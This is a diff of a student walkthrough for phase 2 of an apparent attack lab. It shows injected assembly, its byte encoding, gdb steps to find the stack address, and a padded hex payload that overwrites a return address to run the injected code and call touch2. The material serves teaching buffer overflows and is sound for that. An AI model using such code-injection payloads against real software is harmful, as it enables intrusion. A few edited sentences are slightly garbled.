@@ -1,6 +1,8 @@
+**UPDATED** 
+
 Phase 2 involves injecting a small code and calling function touch2 while making it look like you passed the cookie as an argument to touch2
 
-If you look inside the rtarget and search for touch2, it looks something like this:
+If you look inside the rtarget dump and search for touch2, it looks something like this:
 
 ```
 000000000040178c <touch2>:
@@ -29,11 +31,10 @@ If you read the instruction pdf, it says, "Recall that the first argument to a f
 
 So our goal is to modify the %rdi register and store our cookie in there.
 
-So you have to write some assembly code for that task, create a file called phase2.s and write the below code, replacing the cookie and return address with yours
+So you have to write some assembly code for that task, create a file called phase2.s and write the below code, replacing the cookie and  with yours
 
 ```
   movq $0x434b4b70,%rdi /* move your cookie to register %rdi */
-  pushq $0x0040178c     /* push the address of touch2 to the stack */
   retq                  /* return */
 ```
 
@@ -51,13 +52,12 @@ Disassembly of section .text:
 
 0000000000000000 <.text>:
    0:	48 c7 c7 70 4b 4b 43 	mov    $0x434b4b70,%rdi
-   7:	68 8c 17 40 00       	pushq  $0x40178c
    c:	c3                   	retq   
 ```
 
-The byte representation of the assembly code is `48 c7 c7 70 4b 4b 43 68 8c 17 40 00 c3`
+The byte representation of the assembly code is `48 c7 c7 70 4b 4b 43 c3`
 
-Now you need to find the address of the %rsp register and pass it as the return address since it will execute our injected code
+Now we need to find the address of rsp register
 
 run ctarget through gdb 
 
@@ -71,20 +71,45 @@ run ctarget
 
 `r`
 
-print all the registers 
+Now do 
 
-`info r`
-
-That will prnt the addresses for all registers, grab the one for rsp
-
-Now, create a text file named phase2.txt which will look something like below
+`disas`
+ 
+ You will get something like below (this doesn't match the above code as it is an updated version)
 ```
-48 c7 c7 70 4b 4b 43 68
-8c 17 40 00 c3 00 00 00 /* first 13 bytes of the 24 bytes are the injected code, the rest is just padding */
-00 00 00 00 00 00 00 00
-28 38 62 55 00 00 00 00 /* address of register %rsp */
+   0x000000000040182c <+0>:	  sub    $0x18,%rsp
+   0x0000000000401830 <+4>:	  mov    %rsp,%rdi
+   0x0000000000401833 <+7>:	  callq  0x401ab6 <Gets>
+=> 0x0000000000401838 <+12>:	mov    $0x1,%eax
+   0x000000000040183d <+17>:	add    $0x18,%rsp
+   0x0000000000401841 <+21>:	retq   
+
 ```
 
+Now we need to run the code until the instruction just below `callq  0x401ab6 <Gets>` so you will do something like
+
+`until *0x401838` 
+
+Then it will ask you type a string...type a string longer than the buffer(24 characters in this case). After that do
+
+`x/s $rsp` 
+
+You will get something like
+
+```
+(gdb) x/s $rsp
+0x55620cd8:	"ldsjfsdkfjdslfkjsdlkfjsdlkfjsldkfjsldkjf" // the random string I typed
+```
+The address on the left side is what we want. `0x55620cd8`
+
+Now, create a text file named phase2.txt which will look something like below and don't forget the bytes for rsp and touch2 go in reverse
+```
+48 c7 c7 70 4b 4b 43 c3 /*this sets your cookie*/
+00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
+00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
+d8 0c 62 55 00 00 00 00 /* address of register %rsp */
+8c 17 40 00 00 00 00 00 /*address of touch2 function */
+```
 Run it through hex2raw
 
 `./hex2raw < phase2.txt > raw-phase2.txt`
@@ -93,7 +118,9 @@ Finally, you run the raw file
 
 `./ctarget < raw-phase2.txt`
 
-Response looks like below
+What the exploit does is that first it sets register rdi to our cookie value is transferred to $rsp register
+so after we enter our string and getbuf tries to return control to the calling function, we want it to point to the rsp address 
+so it will execute the code to set the cookie and finally we call touch2 after the cookie is set.
 
 ```
 Cookie: 0x434b4b70
